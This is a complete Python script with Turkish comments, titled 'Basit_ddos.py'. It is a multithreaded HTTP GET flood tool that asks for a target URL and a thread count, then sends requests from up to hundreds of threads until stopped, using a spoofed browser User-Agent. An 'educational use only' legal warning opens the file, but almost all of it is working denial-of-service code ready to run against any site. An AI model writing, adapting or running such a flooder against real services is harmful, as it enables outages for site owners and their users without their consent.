# -*- coding: utf-8 -*-
# Basit_ddos.py

import sys
import time
import threading
import socket # IP kontrolü için

# requests kütüphanesini kontrol et ve yükleme talimatı ver
try:
    import requests
except ImportError:
    print("Hata: 'requests' kütüphanesi bulunamadı.")
    print("Lütfen kurun: pip install requests")
    sys.exit(1)

# Renkler (opsiyonel)
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    R = Fore.RED; Y = Fore.YELLOW; G = Fore.GREEN; C = Fore.CYAN; RESET = Style.RESET_ALL
except ImportError:
    R = Y = G = C = RESET = ""

# ================= YASAL UYARI ==================
print(f"""{R}
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!          YASAL UYARI / WARNING          !!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Bu araç YALNIZCA eğitim amaçlı ve test etme
izniniz olan sistemlerde kullanılmalıdır.

İzinsiz olarak herhangi bir sisteme veya ağa
yönelik olarak kullanılması KESİNLİKLE YASA
DIŞIDIR ve ciddi yasal sonuçları olabilir.

Geliştirici, aracın kötüye kullanılmasından
veya yasa dışı kullanımından sorumlu tutulamaz.
Tüm sorumluluk kullanıcıya aittir.

This tool is intended ONLY for educational
purposes and for use on systems you have
explicit permission to test.

Unauthorized use against any system or network
is STRICTLY ILLEGAL and may have severe legal
consequences.

The developer cannot be held responsible for
any misuse or illegal use of this tool. All
responsibility lies with the user.
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
{RESET}""")
try:
    confirm = input(f"{Y}Yukarıdaki uyarıyı okudum ve anladım. Devam etmek istiyor musunuz? (e/y): {RESET}").strip().lower()
    if confirm not in ['e', 'y']:
        print(f"{G}İşlem iptal edildi.{RESET}")
        sys.exit()
except KeyboardInterrupt:
    print(f"\n{G}İşlem iptal edildi.{RESET}")
    sys.exit()
# =================================================


# İstek gönderme fonksiyonu (durdurma mekanizması ile)
def send_request(target_url, stop_event, thread_id):
    session = requests.Session() # Her thread için ayrı session
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}) # Basit User-Agent
    sent_count = 0
    error_count = 0
    while not stop_event.is_set():
        try:
            response = session.get(target_url, timeout=10) # Timeout ekle
            # Durum kodunu yazdırmak çok fazla çıktı üretebilir, isteğe bağlı
            # print(f"T{thread_id}: İstek gönderildi, Kod: {response.status_code}       ", end='\r')
            sent_count += 1
        except requests.exceptions.Timeout:
            # print(f"{R}T{thread_id}: Zaman Aşımı!{RESET}        ", end='\r')
            error_count +=1
        except requests.exceptions.RequestException as e:
            # Diğer bağlantı hataları
            # print(f"{R}T{thread_id}: Bağlantı Hatası: {e}{RESET}      ", end='\r')
            error_count += 1
        # Çok hızlı istekler için küçük bir bekleme eklenebilir (opsiyonel)
        # time.sleep(0.01)

    print(f"\n{Y}Thread {thread_id} durdu. Gönderilen: {sent_count}, Hata: {error_count}{RESET}")


# DDoS başlatma fonksiyonu
def start_ddos():
    while True:
        target_url = input("Hedef URL (örn: http://example.com veya https://1.2.3.4): ").strip()
        if not target_url:
            print(f"{R}URL boş olamaz!{RESET}")
            continue
        if not (target_url.startswith('http://') or target_url.startswith('https://')):
            print(f"{R}URL 'http://' veya 'https://' ile başlamalı!{RESET}")
            continue
        # Çok basit bir URL doğrulama (daha iyisi yapılabilir)
        if '.' not in target_url:
             print(f"{R}Geçersiz URL formatı gibi görünüyor.{RESET}")
             continue
        break

    while True:
        try:
            threads_count_str = input("Kaç paralel thread kullanılsın? [Önerilen: 50-500]: ").strip()
            if not threads_count_str: # Boşsa varsayılan
                threads_count = 100
                print(f"{Y}Varsayılan thread sayısı kullanılıyor: 100{RESET}")
            else:
                threads_count = int(threads_count_str)
                if threads_count <= 0: raise ValueError("Pozitif olmalı")
            break
        except ValueError:
            print(f"{R}Geçersiz thread sayısı! Pozitif bir tam sayı girin.{RESET}")

    stop_event = threading.Event()
    threads = []

    print(f"\n{C}HTTP GET Flood başlatılıyor -> {target_url} ({threads_count} thread ile){RESET}")
    print(f"{Y}Durdurmak için Ctrl+C'ye basın.{RESET}")
    time.sleep(1)

    for i in range(threads_count):
        t = threading.Thread(target=send_request, args=(target_url, stop_event, i+1))
        threads.append(t)
        t.daemon = True # Ana program bitince threadler de bitsin
        t.start()

    try:
        # Ana thread'in çalışmaya devam etmesini sağla (Ctrl+C'yi bekler)
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Y}Ctrl+C algılandı. Threadler durduruluyor...{RESET}")
        stop_event.set()

    print(f"\n{G}Saldırı durduruldu. Threadlerin bitmesi bekleniyor...{RESET}")
    # Threadlerin bitmesini beklemek iyi olabilir ama daemon oldukları için şart değil
    # for t in threads:
    #    t.join(timeout=2) # Kısa bir süre bekle

    print(f"\n{G}İşlem tamamlandı.{RESET}")

if __name__ == "__main__":
    start_ddos()